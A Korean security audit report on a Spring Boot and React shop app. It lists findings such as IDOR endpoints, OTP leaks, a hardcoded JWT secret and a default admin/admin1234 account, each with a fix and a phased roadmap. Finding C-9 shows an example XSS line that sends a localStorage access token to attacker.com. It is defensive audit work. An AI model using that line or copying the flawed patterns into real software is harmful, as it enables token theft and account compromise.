# GUSA 보안 감사 보고서

**감사일:** 2026-04-01
**대상:** apex (Spring Boot 4.0.4) + gusaFront (React 19)
**결론: 현재 프로덕션 배포 불가**

---

## 요약

| 등급 | 건수 |
|------|------|
| CRITICAL | 9 |
| HIGH | 10 |
| MEDIUM | 7 |

---

## CRITICAL

### C-1. HTTPS 미적용
**파일:** `application.properties`
모든 데이터(토큰, 자격증명, 결제정보)가 평문 전송. SSL/TLS 설정 없음.
→ **배포 전 HTTPS 인증서 필수 설정**

---

### C-2. JWT 시크릿 기본값 하드코딩
**파일:** `application.properties:40`
```properties
jwt.secret=${JWT_SECRET:dev-only-local-secret-do-not-use-in-production-32x}
```
환경 변수 미설정 시 소스 코드의 고정값을 시크릿으로 사용.
→ `JWT_SECRET` 환경 변수를 `openssl rand -hex 32` 이상으로 반드시 설정

---

### C-3. OTP 코드 HTTP 응답에 노출
**파일:** `AuthController.java:56-62`
```java
// TODO: 운영 환경에서는 code를 응답에서 제거하고 SMS로만 발송
return ResponseEntity.ok(ApiResponse.success(Map.of("code", code)));
```
SMS 인증 프로세스가 완전히 무력화됨.
→ 응답에서 code 제거 + 실 SMS API(NHN Toast, Twilio 등) 연동 필수

---

### C-4. OTP를 암호학적으로 취약한 Random으로 생성
**파일:** `PhoneVerificationServiceImpl.java:18`
```java
private final Random random = new Random();  // 예측 가능
```
`java.util.Random`은 시드 예측이 가능하며, OTP 6자리는 최대 1,000,000 경우의 수로 브루트 포스에 취약.
→ `SecureRandom`으로 교체, OTP 저장도 메모리(Caffeine) → Redis로 전환 권장

---

### C-5. 결제 금액 서버 검증 없음
**파일:** `PaymentServiceImpl.java`
PG 응답값의 `amount`를 주문 DB의 `finalAmount`와 비교하지 않음.
공격자가 클라이언트에서 금액을 조작해도 탐지 불가.
```java
// 수정 필요: confirm() 메서드 내부
Order order = orderRepository.findByOrderId(request.getOrderId())
        .orElseThrow(() -> new CustomException(ErrorCode.ORDER_NOT_FOUND));
if (order.getFinalAmount() != response.getAmount()) {
    throw new CustomException(ErrorCode.PAYMENT_AMOUNT_MISMATCH);
}
```

---

### C-6. 주문 조회 API IDOR (Insecure Direct Object Reference)
**파일:** `OrderController.java:34-39`
```java
@GetMapping("/{orderId}")
public ResponseEntity<ApiResponse<OrderResponse>> getOrder(@PathVariable String orderId) {
    return ResponseEntity.ok(ApiResponse.success(orderService.getOrder(orderId)));
}
```
인증된 사용자가 다른 사용자의 `orderId`만 알면 주문 정보 전체 조회 가능.
취소 API에는 이미 소유권 검증 있음(`order.getUserId().equals(userId)`), 조회에도 동일하게 필요.
→ `@AuthenticationPrincipal`로 현재 사용자와 주문 소유자 비교 필수

---

### C-7. 결제 조회 API IDOR
**파일:** `PaymentController.java`
```java
@GetMapping("/user/{userId}")
public ResponseEntity<...> getPaymentsByUser(@PathVariable String userId) {
    return ResponseEntity.ok(...paymentService.getPaymentsByUser(userId));
}
```
`/payments/user/{타인의userId}` 호출 시 타인의 결제 목록 전체 조회 가능.
→ 서비스 레이어에서 현재 인증 사용자 ID와 경로 파라미터 비교 필수

---

### C-8. DataInitializer가 프로덕션에서도 실행
**파일:** `DataInitializer.java:42-62`
```java
.password(passwordEncoder.encode("admin1234"))
log.info("[DataInitializer] 관리자 계정 생성 완료 — ID: admin / PW: admin1234");
```
1. 프로파일 분리 없이 항상 실행 — 프로덕션에 기본 관리자 계정 자동 생성
2. 자격증명이 로그에 평문 출력
→ `@Profile("dev")` 어노테이션 추가 또는 별도 DB init 스크립트로 분리

---

### C-9. 액세스 토큰을 localStorage에 저장
**파일:** `token.ts:7`, `AdminLoginPage.tsx:18`, `LoginPage.tsx`
```typescript
localStorage.setItem('accessToken', accessToken);
```
XSS 공격 한 줄로 토큰 즉시 탈취 가능:
```javascript
fetch('https://attacker.com?t=' + localStorage.getItem('accessToken'))
```
→ `httpOnly` 쿠키로 이전 권장. 단기적으로는 Content-Security-Policy 헤더로 XSS 방어 강화

---

## HIGH

### H-1. Refresh Token 없음 (관리자)
**파일:** `AdminLoginPage.tsx:17-18`
```typescript
const { accessToken } = await adminLogin(userId, password);
localStorage.setItem('accessToken', accessToken);  // refreshToken 저장 안 함
```
관리자 토큰 만료(1시간) 시 갑자기 로그아웃됨. `/auth/refresh` 엔드포인트 자체도 미구현.
→ 백엔드 Refresh Token 발급 + `/auth/refresh` 엔드포인트 구현 필요

---

### H-2. Rate Limiting 부재
로그인, OTP 발송, 결제 확인 엔드포인트에 요청 횟수 제한 없음.
- 브루트 포스 로그인 공격 가능
- OTP 1,000,000가지 완전 탐색 가능
- 결제 API 반복 호출 가능
→ Bucket4j 또는 Spring Cloud Gateway Rate Limiter 적용

---

### H-3. PrivateRoute가 토큰 유효성 검증 안 함
**파일:** `PrivateRoute.tsx:4-6`
```typescript
const token = localStorage.getItem('accessToken');
if (!token) return <Navigate to="/admin/login" replace />;
```
만료된 토큰, 임의 문자열도 관리자 페이지 진입 가능 (서버 요청 시 401 발생하긴 함).
→ `isAdmin()` 함수로 역할 검증 + 만료 시간 체크 추가

---

### H-4. 주문 수량 음수/0 허용
**파일:** `OrderServiceImpl.java:34-41`
```java
totalAmount += (long) product.getPrice() * item.getQuantity();
```
`quantity`가 0 또는 음수이면 주문 금액이 비정상.
→ `OrderItemRequest`에 `@Min(1)` 검증 추가

---

### H-5. 주문 상태 전이 규칙 없음
**파일:** `OrderServiceImpl.java:139-144`
```java
order.updateStatus(status);  // 모든 상태 전이 허용
```
DELIVERED → PENDING, CANCELED → SHIPPING 등 역방향 전이 가능.
→ 허용 전이 맵 정의(`PENDING→PAID→SHIPPING→DELIVERED`, `PENDING/PAID→CANCELED`) 및 검증 로직 추가

---

### H-6. PG 자격증명 DB 평문 저장
**파일:** `PgSetting.java:26-28`
```java
private String apiKey;
private String apiSecret;
```
DB 접근 시 결제 API 키가 평문으로 노출됨.
→ Jasypt 컬럼 암호화 또는 AWS Secrets Manager/HashiCorp Vault 사용

---

### H-7. H2 DB 사용 (프로덕션 부적합)
**파일:** `application.properties:6-9`
```properties
spring.datasource.url=jdbc:h2:tcp://localhost/~/test
spring.datasource.username=sa
spring.datasource.password=
```
빈 비밀번호, H2는 프로덕션 부적합.
→ PostgreSQL 또는 MySQL로 전환 + 강력한 DB 비밀번호 설정

---

### H-8. 보안 HTTP 헤더 미설정
Spring Security 기본 헤더 외에 추가 구성 필요:

| 헤더 | 위험 |
|------|------|
| `Content-Security-Policy` | XSS |
| `X-Frame-Options: DENY` | 클릭재킹 |
| `X-Content-Type-Options: nosniff` | MIME 스니핑 |
| `Strict-Transport-Security` | HTTPS 다운그레이드 |

```java
// SecurityConfig에 추가
.headers(h -> h
    .frameOptions(f -> f.deny())
    .contentTypeOptions(Customizer.withDefaults())
    .httpStrictTransportSecurity(hsts ->
        hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    .contentSecurityPolicy(csp ->
        csp.policyDirectives("default-src 'self'"))
)
```

---

### H-9. axios 기본 URL 하드코딩
**파일:** `axios.ts:13-14`
```typescript
baseURL: 'http://localhost:8080',
```
→ `import.meta.env.VITE_API_URL`로 환경 변수화, `.env.production`에서 HTTPS URL 설정

---

### H-10. CORS 프로덕션 도메인 미설정
**파일:** `SecurityConfig.java:104`
```java
config.setAllowedOrigins(List.of("http://localhost:5173", "http://localhost:8081"));
```
→ 환경 변수로 허용 Origin 관리, 프로덕션 도메인 추가

---

## MEDIUM

### M-1. JWT 예외 구분 없이 일괄 처리
**파일:** `JwtUtil.java:48-55`
```java
} catch (Exception e) {
    return false;  // 만료/변조/서명 오류를 구분 없이 처리
}
```
→ `ExpiredJwtException`, `SignatureException` 등 개별 catch + warn 로깅 추가 (모니터링용)

---

### M-2. 비밀번호 복잡성 정책 없음
**파일:** `UserRequest.java`
`@NotBlank`만 있고 최소 길이·복잡성 검증 없음.
→ `@Size(min=8)` + 숫자/특수문자 포함 정규식 검증 추가

---

### M-3. 개인정보 평문 저장
**파일:** `User.java:26-37`
이름, 이메일, 전화번호, 주소 모두 평문 DB 저장. 개인정보보호법(PIPA) 준수 필요.
→ JPA `@Convert` + AES-256 암호화 적용

---

### M-4. 프로덕션 로그 레벨 과다
**파일:** `application.properties:73`
```properties
logging.level.com.gusa.apex=debug
```
→ 프로덕션 프로파일에서 `warn` 또는 `info`로 변경

---

### M-5. 환경 프로파일 분리 없음
모든 설정이 `application.properties` 하나에 집중.
→ `application-dev.properties` / `application-prod.properties` 분리

---

### M-6. 감사 로그(Audit Log) 없음
관리자 작업, 결제 처리, 개인정보 변경이 추적되지 않음.
→ `@EntityListeners(AuditingEntityListener.class)` + 별도 감사 테이블 구현

---

### M-7. 파일 업로드 MIME 타입 검증 미흡
**파일:** `ProductServiceImpl.java:134-150`
파일 확장자로만 판단하며 실제 파일 내용 검증 없음.
→ Apache Tika로 Magic Number 기반 실제 MIME 타입 검증 추가

---

## 잘 구현된 부분 (강점)

| 항목 | 상태 |
|------|------|
| BCrypt 패스워드 해싱 | ✅ 올바른 사용 |
| Spring Data JPA 파라미터 바인딩 (SQL 인젝션 방어) | ✅ |
| GlobalExceptionHandler (스택트레이스 클라이언트 미노출) | ✅ |
| ApiResponse\<T\> 통일 응답 구조 | ✅ |
| SecurityConfig 엔드포인트별 권한 설정 | ✅ 구조적으로 올바름 |
| PgClient 팩토리 패턴 (확장성) | ✅ |
| HikariCP 커넥션 풀 설정 | ✅ 운영 수준 설정 |
| JPQL LIKE CONCAT 파라미터 바인딩 | ✅ SQL 인젝션 방어 |
| 주문 취소 소유권 검증 | ✅ |
| CustomException + ErrorCode 도메인 예외 분리 | ✅ |

---

## 수정 로드맵

### Phase 1 — 배포 전 필수 (CRITICAL 전체, 약 1~2주)
- [ ] HTTPS 인증서 적용 (Let's Encrypt 또는 상용)
- [ ] `JWT_SECRET` 환경 변수 설정 (`openssl rand -hex 32`)
- [ ] OTP 응답에서 코드 제거 + SMS API 연동
- [ ] `SecureRandom` + Redis OTP 저장소 전환
- [ ] 결제 금액 서버 검증 (DB `finalAmount` vs PG 응답 비교)
- [ ] 주문/결제 조회 IDOR 수정 (소유권 검증 추가)
- [ ] `DataInitializer`에 `@Profile("dev")` 추가 및 로그 자격증명 제거
- [ ] 토큰 저장 방식 개선 (`httpOnly` 쿠키 또는 CSP 헤더 강화)

### Phase 2 — 1~2개월 (HIGH 전체)
- [ ] Refresh Token 구현 + `/auth/refresh` 엔드포인트
- [ ] Rate Limiting (Bucket4j) — 로그인, OTP, 결제
- [ ] `PrivateRoute` 토큰 유효성 + 역할 검증
- [ ] `OrderItemRequest`에 `@Min(1)` 수량 검증
- [ ] 주문 상태 전이 규칙 구현
- [ ] PG 자격증명 암호화 (Jasypt 또는 Vault)
- [ ] PostgreSQL 전환 + DB 비밀번호 설정
- [ ] 보안 HTTP 헤더 추가 (CSP, HSTS, X-Frame-Options)
- [ ] `VITE_API_URL` 환경 변수화 + HTTPS URL
- [ ] CORS 프로덕션 도메인 설정

### Phase 3 — 2~3개월 (MEDIUM + 운영 성숙도)
- [ ] 개인정보 필드 AES-256 암호화
- [ ] 감사 로그 구현
- [ ] 비밀번호 복잡성 정책 강화
- [ ] 파일 업로드 MIME 검증 (Apache Tika)
- [ ] `application-dev.properties` / `application-prod.properties` 분리
- [ ] 프로덕션 로그 레벨 조정
- [ ] 의존성 취약점 자동 스캔 (Dependabot, OWASP Dependency-Check)
- [ ] 보안 회귀 테스트 자동화 (OWASP ZAP CI 통합)
